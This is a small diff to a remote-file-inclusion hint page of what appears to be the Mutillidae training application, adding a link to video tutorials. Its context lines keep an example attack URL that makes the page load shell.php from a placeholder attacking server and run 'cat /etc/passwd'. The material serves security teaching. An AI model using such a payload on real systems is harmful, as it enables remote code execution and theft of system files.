@@ -4,6 +4,8 @@
 			Remote file inclusion allows an attacker to include file remote 
 			(from the web servers point of view)
 			possibly allowing code execution, denial of service, and data disclosure.
+<br/><br/>
+<a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-48-48.png" style="margin-right: 10px;" />Video Tutorials</a>
 			<br/><br/>
 			<span class="report-header">Discovery Methodology</span>
 			<br/><br/>
@@ -41,7 +43,7 @@
 http://mutillidae/index.php?page=http://[ATTACKING SERVER IP ADDRESS]/shell.php?pCommand=cat%2b%2fetc%2fpasswd
 </code>
 			<br/>
-			<span class="report-header">Videos</span>
+			<span id="videos" class="report-header">Videos</span>
 			<br/><br/>
 			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoExploitLocalFileInclusionVulnerabilityusingBurpSuite);?>
 			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->ISSA2013WebPentestingWorkshopPart6LocalRemoteFileInclusion);?>
